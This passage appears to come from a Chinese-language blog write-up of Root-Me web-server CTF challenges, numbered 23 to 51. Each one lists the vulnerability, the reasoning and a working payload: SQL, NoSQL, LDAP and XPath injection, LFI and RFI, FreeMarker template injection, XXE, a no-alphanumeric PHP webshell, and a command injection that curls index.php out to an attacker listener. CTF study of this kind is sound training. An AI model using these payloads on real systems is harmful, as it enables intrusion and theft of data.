</p></blockquote><p>接着使用如下命令压缩这个符号链接。 &amp;#x20;</p><blockquote><p>zip –symlinks index.zip index.txt</p></blockquote><p>上传这个zip文件，再访问index.txt,即可读到服务器上的index.php</p><h2 id="23-Command-injection-Filter-bypass"><a href="#23-Command-injection-Filter-bypass" class="headerlink" title="23.Command injection - Filter bypass"></a>23.Command injection - Filter bypass</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch53/index.php" title="http://challenge01.root-me.org/web-serveur/ch53/">http://challenge01.root-me.org/web-serveur/ch53/</a><br>[+]Statement:找到漏洞并利用，她有一些保护。flag在index.php里<br>[+]Solution:同样的命令注入，发现过滤掉了一些符号，同时命令的运行结果不会返回，经过测试发现 - 没有被过滤，但 | &lt; &gt; ; \ ` &amp; 等符号被过滤掉了，但是仍然可以用%0a注入新的命令，另外反弹shell不太能实现，选择使用curl上传文件的方法读文件。先在vps上监听 &amp;#x20;</p><blockquote><p>nc -lvv 9999</p></blockquote><p>接着执行payload如下，可以读到index.php &amp;#x20;<br>[+]Payload:127.0.0.1%0acurl -F ‘filename&#x3D;@index.php’ HOST_ADDRESS:9999</p><h2 id="24-Local-File-Inclusion"><a href="#24-Local-File-Inclusion" class="headerlink" title="24.Local File Inclusion"></a>24.Local File Inclusion</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch16/" title="http://challenge01.root-me.org/web-serveur/ch16/">http://challenge01.root-me.org/web-serveur/ch16/</a><br>[+]Statement:获得Admin的部分<br>[+]Solution:该服务器是一个明显的本地文件包含，结合提示构造url读取admin下的index.php<br>[+]Payload:<a href="http://challenge01.root-me.org/web-serveur/ch16/?files=crypto&f=../../admin/index.php" title="http://challenge01.root-me.org/web-serveur/ch16/?files=crypto&amp;f=../../admin/index.php">http://challenge01.root-me.org/web-serveur/ch16/?files=crypto&amp;f&#x3D;..&#x2F;..&#x2F;admin&#x2F;index.php</a></p><h2 id="25-Local-File-Inclusion-Double-encoding"><a href="#25-Local-File-Inclusion-Double-encoding" class="headerlink" title="25.Local File Inclusion - Double encoding"></a>25.Local File Inclusion - Double encoding</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch45/" title="http://challenge01.root-me.org/web-serveur/ch45/">http://challenge01.root-me.org/web-serveur/ch45/</a><br>[+]Statement:在网站的源码里找到认证密码<br>[+]Solution:在URL里发现是一个文件包含。直接使用php:&#x2F;&#x2F;filter&#x2F;…会发现被拦截了。根据提示，进行url编码，编码一次还是会被拦截，当编码两次时成功绕过。此处需要注意的是，使用在线的或者是python等urlencode的api时，它不会编码 . ,需要手动把.编码成%2e,才能绕过。通过查看源码，可以找到存在密码的config.inc.php<br>[+]Payload:</p><ul><li>php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv</li><li>php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf</li></ul><h2 id="26-PHP-Loose-Comparison"><a href="#26-PHP-Loose-Comparison" class="headerlink" title="26.PHP - Loose Comparison"></a>26.PHP - Loose Comparison</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch55/" title="http://challenge01.root-me.org/web-serveur/ch55/">http://challenge01.root-me.org/web-serveur/ch55/</a> &amp;#x20;<br>[+]Solution:页面可以查看源码。代码的逻辑是传入两个字母和数字组成的字符串，第一个字符串和一个随机数拼接，要求和第二个参数的md5值相等。题目使用&#x3D;&#x3D;来判断。&#x3D;&#x3D;在两者的类型不同时先转换类型为相同再比较，如果有数字类型的就会按数字类型转换。根据题目构造payload，即可获得flag &amp;#x20;<br>[+]Payload:s&#x3D;0e242&amp;h&#x3D;240610708&amp;submit&#x3D;Check</p><h2 id="27-PHP-preg-replace"><a href="#27-PHP-preg-replace" class="headerlink" title="27.PHP preg_replace()"></a>27.PHP preg_replace()</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch37/index.php" title="http://challenge01.root-me.org/web-serveur/ch37/index.php">http://challenge01.root-me.org/web-serveur/ch37/index.php</a> &amp;#x20;<br>[+]Statement:读flag.php &amp;#x20;<br>[+]Solution:经过测试发现页面的三个输入点分别对应preg_replace的三个参数，利用preg_replace在第一个参数有&#x2F;e的标示下，当满足匹配时会把第二个参数当作代码执行，因此构造payload可以读文件 &amp;#x20;<br>[+]Payload:search&#x3D;&#x2F;a&#x2F;e&amp;replace&#x3D;file_get_contents(‘flag.php’)&amp;content&#x3D;a</p><h2 id="28-PHP-type-juggling"><a href="#28-PHP-type-juggling" class="headerlink" title="28.PHP type juggling"></a>28.PHP type juggling</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch44/" title="http://challenge01.root-me.org/web-serveur/ch44/">http://challenge01.root-me.org/web-serveur/ch44/</a> &amp;#x20;<br>[+]Solution:可以看到源码，页面的逻辑是需要满足$auth[‘data’][‘login’] &#x3D;&#x3D; $USER &amp;&amp; !strcmp($auth[‘data’][‘password’]。同样是两个弱类型比较，第一个只需要满足值为0或者为true，即可绕过，strcmp需要使传入的参数为不含有字母的数组，即可绕过。 &amp;#x20;</p><p>[+]Payload:auth&#x3D;%7B%22data%22%3A%7B%22login%22%3A0%2C%22password%22%3A[122]%7D%7D</p><h2 id="29-Remote-File-Inclusion"><a href="#29-Remote-File-Inclusion" class="headerlink" title="29.Remote File Inclusion"></a>29.Remote File Inclusion</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch13/" title="http://challenge01.root-me.org/web-serveur/ch13/">http://challenge01.root-me.org/web-serveur/ch13/</a> &amp;#x20;<br>[+]Statement:获取PHP源代码 &amp;#x20;<br>[+]Solution:测试发现有文件包含，且开启了allow_url_fopen和allow_url_include，即可以实现远程文件包含。由于在代码执行时，用户的参数被加上了后缀，使用php:&#x2F;&#x2F;input或者是file:&#x2F;&#x2F;….不太好用，因此选择使用data:text&#x2F;plain,&lt;?php … ?&gt;进行文件包含，可以读到源码 &amp;#x20;<br>[+]Payload:?lang&#x3D;data:text&#x2F;plain,&lt;?php echo file_get_contents(‘index.php’); ?&gt;</p><h2 id="30-Server-side-Template-Injection"><a href="#30-Server-side-Template-Injection" class="headerlink" title="30.Server-side Template Injection"></a>30.Server-side Template Injection</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch41/" title="http://challenge01.root-me.org/web-serveur/ch41/">http://challenge01.root-me.org/web-serveur/ch41/</a> &amp;#x20;<br>[+]Statement:JAVA EE。利用漏洞获得SECRET_FLAG.txt中的密码。 &amp;#x20;<br>[+]Solution:根据提示，得知服务器使用的中间件为JAVAEE，查询资料得知FreeMarker为java下最受欢迎的模版引擎，利用其格式在输入点输入${3*3}，发现被渲染成了9。利用FreeMarker的一个可以用来执行命令的类构造出如下payload，即可查看flag内容。 &amp;#x20;<br>[+]Payload:nickname&#x3D;&lt;#assign ex&#x3D;”freemarker.template.utility.Execute”?new()&gt; ${ ex(“cat SECRET_FLAG.txt”) }</p><h2 id="31-SQL-injection-authentication"><a href="#31-SQL-injection-authentication" class="headerlink" title="31.SQL injection - authentication"></a>31.SQL injection - authentication</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch9/" title="http://challenge01.root-me.org/web-serveur/ch9/">http://challenge01.root-me.org/web-serveur/ch9/</a> &amp;#x20;<br>[+]Statement:获取管理员的密码 &amp;#x20;<br>[+]Solution:无任何过滤的注入，通过order by参数可以控制登录的用户，审查元素获得密码 &amp;#x20;<br>[+]Payload:login&#x3D;123#&amp;password&#x3D;1’ or ‘1’&#x3D;’1’ order by 1 –+</p><h2 id="32-SQL-injection-authentication-GBK"><a href="#32-SQL-injection-authentication-GBK" class="headerlink" title="32.SQL injection - authentication - GBK"></a>32.SQL injection - authentication - GBK</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch42/" title="http://challenge01.root-me.org/web-serveur/ch42/">http://challenge01.root-me.org/web-serveur/ch42/</a> &amp;#x20;<br>[+]Statement:获取管理员的密码 &amp;#x20;<br>[+]Solution:根据题目判断是宽字节注入，所以利用%df逃逸PHP函数的转译。 &amp;#x20;<br>[+]Payload:login&#x3D;%bf’ or 1&#x3D;1 – -&amp;password&#x3D;abc</p><h2 id="33-SQL-injection-string"><a href="#33-SQL-injection-string" class="headerlink" title="33.SQL injection - string"></a>33.SQL injection - string</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch19/" title="http://challenge01.root-me.org/web-serveur/ch19/">http://challenge01.root-me.org/web-serveur/ch19/</a> &amp;#x20;<br>[+]Statment:获取管理员密码 &amp;#x20;<br>[+]Solution:测试网页，发现在action&#x3D;recherche页面可以使用union函数注入，并且有回显。一步步构造Payload获取管理员密码 &amp;#x20;<br>[+]Payload:</p><blockquote><p>recherche&#x3D;1’ union select 1,name FROM sqlite_master where tpye&#x3D;’table’–+<br>recherche&#x3D;1’ union select 1,sql FROM sqlite_master where type&#x3D;’table’ –+<br>recherche&#x3D;1’ union select username,password FROM users  –+</p></blockquote><h2 id="34-LDAP-injection-authentication"><a href="#34-LDAP-injection-authentication" class="headerlink" title="34.LDAP injection - authentication"></a>34.LDAP injection - authentication</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch25/" title="http://challenge01.root-me.org/web-serveur/ch25/">http://challenge01.root-me.org/web-serveur/ch25/</a><br>[+]Statement:绕过验证<br>[+]Solution:根据题目提示为LDAP注入，LDAP是一种轻量级目录协议，主要用于资源查询。输入 username&#x3D;<em>)(%26&amp;password&#x3D;111发现页面报错，并给出了查询的结构，根据给出查询结构，构造Payload，即可绕过<br>[+]Payload:username&#x3D;</em>)(|(userPassword&#x3D; *&amp;password&#x3D;1)</p><h2 id="35-NoSQL-injection-authentication"><a href="#35-NoSQL-injection-authentication" class="headerlink" title="35.NoSQL injection - authentication"></a>35.NoSQL injection - authentication</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch38/" title="http://challenge01.root-me.org/web-serveur/ch38/">http://challenge01.root-me.org/web-serveur/ch38/</a><br>[+]Statement:找到隐藏用户的用户名<br>[+]Solution:题目提示NoSQL注入，查询资料了解mongodb的基本命令和注入方法。了解到$ne为!&#x3D;符号，构造payload可以形成重言式注入。构造Payload如下: &amp;#x20;</p><blockquote><p>login[$ne]&#x3D;123&amp;pass[$ne]&#x3D;123</p></blockquote><p>它在服务器端会被解释为{‘login’&#x3D;&gt;{‘$ne’&#x3D;&gt;’123’},’pass’&#x3D;&gt;{‘$ne’&#x3D;&gt;’123’}}，从单一目标查询变成了条件查询，形成永真式。此时页面返回You are connected as:admin。并没有给出flag。于是更改Payload如下： &amp;#x20;</p><blockquote><p>login[$ne]&#x3D;admin&amp;pass[$ne]&#x3D;123</p></blockquote><p>页面此时返回You are connected as:test。这个用户也不是隐藏用户。于是使用mongodb的正则表达式筛选非admin或者test用户。Payload如下 &amp;#x20;</p><blockquote><p>login[$regex]&#x3D;^[^(a|t)]&amp;pass[$ne]&#x3D;1</p></blockquote><p>即可得到flag。</p><h2 id="36-Path-Truncation"><a href="#36-Path-Truncation" class="headerlink" title="36.Path Truncation"></a>36.Path Truncation</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch35/" title="http://challenge01.root-me.org/web-serveur/ch35/">http://challenge01.root-me.org/web-serveur/ch35/</a><br>[+]Statement:获取进入管理员空间的方法<br>[+]Solution:根据提示得知是路径截断，结合PHP limit提示，查询资料得知在</p><blockquote><p>page&#x3D;a&#x2F;..&#x2F;admin.html&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;</p></blockquote><h2 id="37-PHP-Serialization"><a href="#37-PHP-Serialization" class="headerlink" title="37.PHP Serialization"></a>37.PHP Serialization</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch28/" title="http://challenge01.root-me.org/web-serveur/ch28/">http://challenge01.root-me.org/web-serveur/ch28/</a><br>[+]Statement:获取管理员的访问权限<br>[+]Solution:可以看到源码，分析源码逻辑。最终目的是要使$_SESSION[‘login’]&#x3D;admin。其中关键变量$data有两种赋值方式，一种是通过传入的POST参数赋值，另一种是从cookie里的autologin的值反序列化得到。下面的验证逻辑是比较$data[‘password’]=&#x3D;$auth[$data[‘login’]],后者的值应该为一个字符串，而这里可以里用&#x3D;&#x3D;的弱类型比较，使$data[‘password’]的值为true，即可绕过比较。因此构造php页面如下 &amp;#x20;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data[&#x27;login&#x27;]=&#x27;superadmin&#x27;;</span><br><span class="line">$data[&#x27;password&#x27;]=true;</span><br><span class="line">echo(urlencode(serialize($data)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造Cookie如下，并且去掉POST的两个参数，即可绕过。 &amp;#x20;<br>[+]Payload:Cookie:autologin&#x3D;a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D</p><h2 id="38-SQL-injection-numeric"><a href="#38-SQL-injection-numeric" class="headerlink" title="38.SQL injection - numeric"></a>38.SQL injection - numeric</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch18/" title="http://challenge01.root-me.org/web-serveur/ch18/">http://challenge01.root-me.org/web-serveur/ch18/</a><br>[+]Statement:获取管理员的密码<br>[+]Solution:当输入1‘时，发现会报错，提示存在\，判断应该是加了waf过滤。根据题目提示，为数字型注入，因此不使用单双引号进行注入。<br>[+]Payload: &amp;#x20;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">action=news&amp;news_id=4%20union%20select%201,name,sql%20from%20sqlite_master</span><br><span class="line">action=news&amp;news_id=4%20union%20select%201,username,password%20from%20users</span><br></pre></td></tr></table></figure><h2 id="39-SQL-Injection-Routed"><a href="#39-SQL-Injection-Routed" class="headerlink" title="39.SQL Injection - Routed"></a>39.SQL Injection - Routed</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch49/" title="http://challenge01.root-me.org/web-serveur/ch49/">http://challenge01.root-me.org/web-serveur/ch49/</a><br>[+]Statement:找到管理员的密码<br>[+]Solution:题目的意思为路由注入，也就跟二次注入差不多，查看页面逻辑，第一个页面怎么登录都显示账户或密码错误，第二个页面发现可以注入，当输入’union select 1时，页面的第二行数据显示为1，根据提示，再在联合查询后跟一个子联合查询，并且使用16进制表示以绕过waf。由于直接查询读数我这里老出语法错误，因此我使用基于报错的查询方式构造Payload，一步步读出密码<br>[+]Payload:（需要16进制编码） &amp;#x20;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select concat(0x7e,database(),0x7e),0 or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;c_webserveur_49&quot; ),0x7e),1)&#x27;--+</span><br><span class="line">&#x27;union select concat(0x7e,database(),0x7e),0 or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; ),0x7e),1)&#x27;--+</span><br><span class="line">&#x27;union select concat(0x7e,database(),0x7e),0 or updatexml(1,concat(0x7e,(select concat_ws(&#x27;:&#x27;,login,password) from users limit 1),0x7e),1)&#x27;--+</span><br></pre></td></tr></table></figure><h2 id="40-PHP-Eval"><a href="#40-PHP-Eval" class="headerlink" title="40.PHP - Eval"></a>40.PHP - Eval</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch57/" title="http://challenge01.root-me.org/web-serveur/ch57/">http://challenge01.root-me.org/web-serveur/ch57/</a><br>[+]Statement:找到这个服务器的漏洞并利用。flag在.passwd文件中。<br>[+]Solution:题目给出了源码，大致意思是需要构造一个没有字母和反斜杠的webshell，之前看<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" title="P总的文章">P总的文章</a>里有详细介绍无字母数字的webshell构造方法，利用位运算里的取反操作符～可以把汉字里某些字符变成字母，利用这个特性，构造出Payload，可构造出webshell。<br>[+]Payload: &amp;#x20;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input=$__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);$_=$__/$__;$____=&#x27;&#x27;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#x27;_&#x27;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);&amp;2=system(&#x27;cat .passwd&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="41-XML-External-Entity"><a href="#41-XML-External-Entity" class="headerlink" title="41.XML External Entity"></a>41.XML External Entity</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch29/" title="http://challenge01.root-me.org/web-serveur/ch29/">http://challenge01.root-me.org/web-serveur/ch29/</a><br>[+]Statement:获取管理员的密码<br>[+]Solution:题目考察XXE(外部实体注入)，打开页面是一个在线检测网页是不是合法的RSS格式的页面，可以输入文件的地址。于是在vps上创建一个xsl文件，在里面加入xxePayload，并加上合法的RSS文件格式，在W3CSchool可以找到。输入网址，可以实现文件读取。<br>[+]Payload: &amp;#x20;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY sp SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot;&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">  &lt;title&gt;&amp;sp;&lt;/title&gt;</span><br><span class="line">  &lt;link&gt;https://www.w3schools.com&lt;/link&gt;</span><br><span class="line">  &lt;description&gt;Free web building tutorials&lt;/description&gt;</span><br><span class="line">  &lt;item&gt;</span><br><span class="line">    &lt;title&gt;&amp;sp;&lt;/title&gt;</span><br><span class="line">    &lt;link&gt;https://www.w3schools.com/xml/xml_rss.asp&lt;/link&gt;</span><br><span class="line">    &lt;description&gt;New RSS tutorial on W3Schools&lt;/description&gt;</span><br><span class="line">  &lt;/item&gt;</span><br><span class="line">  &lt;item&gt;</span><br><span class="line">    &lt;title&gt;XML Tutorial&lt;/title&gt;</span><br><span class="line">    &lt;link&gt;https://www.w3schools.com/xml&lt;/link&gt;</span><br><span class="line">    &lt;description&gt;New XML tutorial on W3Schools&lt;/description&gt;</span><br><span class="line">  &lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure><h2 id="42-SQL-Truncation"><a href="#42-SQL-Truncation" class="headerlink" title="42.SQL Truncation"></a>42.SQL Truncation</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch36/" title="http://challenge01.root-me.org/web-serveur/ch36/">http://challenge01.root-me.org/web-serveur/ch36/</a><br>[+]Statement:找到进入管理员空间的方法<br>[+]Solution:利用sql截断的特性。在页面的源码里给出了创建表的sql语句。可以看到用户名只有12位，当我们注册如下账户admin a时，mysql会默认截断12位后的a，当服务器的配置不当时，我们此时就已经修改了admin的密码。</p><h2 id="43-XPath-injection-authentication"><a href="#43-XPath-injection-authentication" class="headerlink" title="43.XPath injection - authentication"></a>43.XPath injection - authentication</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch23/" title="http://challenge01.root-me.org/web-serveur/ch23/">http://challenge01.root-me.org/web-serveur/ch23/</a><br>[+]Statement:找到管理员的密码<br>[+]Solution:Xpath类型的认证注入，构造永真式，同时根据member页面显示的管理员的用户名，构造payload，获取管理员权限<br>[+]Payload:username&#x3D;John or ‘1’&#x3D;’1&amp;password&#x3D;123</p><h2 id="44-Local-File-Inclusion-Wrappers"><a href="#44-Local-File-Inclusion-Wrappers" class="headerlink" title="44.Local File Inclusion - Wrappers"></a>44.Local File Inclusion - Wrappers</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch43/" title="http://challenge01.root-me.org/web-serveur/ch43/">http://challenge01.root-me.org/web-serveur/ch43/</a><br>[+]Statement:找到flag<br>[+]Solution:这是一个结合文件上传、文件包含和伪协议的题。通过使用<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#wrapper-zip" title="github上的zip文件上传payload">github上的zip文件上传payload</a>，绕过图片类型检测，并通过执行代码里的show_source(‘index.php’)，查看到源码。但发现服务器禁止了外部命令执行的函数。通过列目录，发现flag文件，再用show_source查看flag文件。<br>[+]Payload: &amp;#x20;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;pre&gt;&lt;?php</span><br><span class="line">function get_allfiles($path,&amp;$files)</span><br><span class="line">&#123;</span><br><span class="line">    if(is_dir($path))</span><br><span class="line">    &#123;</span><br><span class="line">        $dp = dir($path);</span><br><span class="line">        while ($file = $dp -&gt;read())</span><br><span class="line">        &#123;</span><br><span class="line">            if($file !== &quot;.&quot; &amp;&amp; $file !== &quot;..&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                get_allfiles($path.&quot;/&quot;.$file, $files);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $dp -&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    if(is_file($path))</span><br><span class="line">    &#123;</span><br><span class="line">        $files[] =  $path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function get_filenamesbydir($dir)</span><br><span class="line">&#123;</span><br><span class="line">    $files =  array();</span><br><span class="line">    get_allfiles($dir,$files);</span><br><span class="line">    return $files;</span><br><span class="line">&#125;</span><br><span class="line">$filenames = get_filenamesbydir(&quot;./&quot;);</span><br><span class="line">//打印所有文件名，包括路径</span><br><span class="line">foreach ($filenames as $value)</span><br><span class="line">&#123;</span><br><span class="line">    echo $value, PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;&lt;/pre&gt;</span><br><span class="line">&#x27; &gt; a.php;</span><br><span class="line">zip payload.zip a.php;</span><br><span class="line">mv payload.zip payload.jpg;</span><br><span class="line">http://challenge01.root-me.org/web-serveur/ch43/index.php?page=zip://tmp/upload/3rqsJvyOk.jpg%23a</span><br></pre></td></tr></table></figure><h2 id="45-SQL-injection-Error"><a href="#45-SQL-injection-Error" class="headerlink" title="45.SQL injection - Error"></a>45.SQL injection - Error</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch34/" title="http://challenge01.root-me.org/web-serveur/ch34/">http://challenge01.root-me.org/web-serveur/ch34/</a><br>[+]Statement:找到管理员的密码<br>[+]Solution:页面的第一个页面无法注入。但第二个页面的order参数可以注入。利用sqlmap可以注入出数据。<br>[+]Payload:action&#x3D;contents&amp;order&#x3D;ASC,(SELECT (CASE WHEN (8970&#x3D;8970) THEN 1 ELSE 1&#x2F;(SELECT 0) END))</p><h2 id="46-SQL-injection-Insert"><a href="#46-SQL-injection-Insert" class="headerlink" title="46.SQL injection - Insert"></a>46.SQL injection - Insert</h2><h2 id="47-XSLT-Code-execution"><a href="#47-XSLT-Code-execution" class="headerlink" title="47.XSLT - Code execution"></a>47.XSLT - Code execution</h2><h2 id="48-Java-Spring-Boot"><a href="#48-Java-Spring-Boot" class="headerlink" title="48.Java - Spring Boot"></a>48.Java - Spring Boot</h2><h2 id="49-SQL-injection-file-reading"><a href="#49-SQL-injection-file-reading" class="headerlink" title="49.SQL injection - file reading"></a>49.SQL injection - file reading</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch31/" title="http://challenge01.root-me.org/web-serveur/ch31/">http://challenge01.root-me.org/web-serveur/ch31/</a><br>[+]Statement:找到管理员的密码<br>[+]Solution:member页面的id参数可以注入，使用union select可以读到表里的member密码。但是并不是正确的密码。按照题目要求，需要读文件。使用load_file()函数读取，猜测文件路径，最后确定为&#x2F;challenge&#x2F;web-serveur&#x2F;ch31&#x2F;index.php，这里因为单双引号被过滤了，所以使用16进制表示。然后可以读到index.php源码。源码里给出了从数据库里的密码到和输入比较的字符串的解密函数，在本地利用这个函数计算出真实密码值，另外注意到源码里是输入的sha1值等于这个值，所以在在线的sha1解密网站解密这个值，得到最终的密码<br>[+]Payload: &amp;#x20;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch31/?action=members&amp;id=-1 union select load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),2,3,4-- +</span><br></pre></td></tr></table></figure><h2 id="50-XPath-injection-string"><a href="#50-XPath-injection-string" class="headerlink" title="50.XPath injection - string"></a>50.XPath injection - string</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch27/" title="http://challenge01.root-me.org/web-serveur/ch27/">http://challenge01.root-me.org/web-serveur/ch27/</a><br>[+]Statement:获取管理员密码<br>[+]Solution:在member页面可以注入，并且测试发现会出现输入语句的报错，构造payload可以读到用户名和密码。一对一对测试可以找到管理员账号。<br>[+]Payload: &amp;#x20;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or (&#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;)]|//user/password[contains(.,&#x27;</span><br></pre></td></tr></table></figure><h2 id="51-NoSQL-injection-blind"><a href="#51-NoSQL-injection-blind" class="headerlink" title="51.NoSQL injection - blind"></a>51.NoSQL injection - blind</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch48/" title="http://challenge01.root-me.org/web-serveur/ch48/">http://challenge01.root-me.org/web-serveur/ch48/</a><br>[+]Statement:这是一个web应用，找到nosqlblind的flag<br>[+]Solution:在name输入nosqlblind，利用基于布尔类型的注入，使用regex一位一位的进行注入，最终可以得到flag。<br>[+]Payload: &amp;#x20;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> import 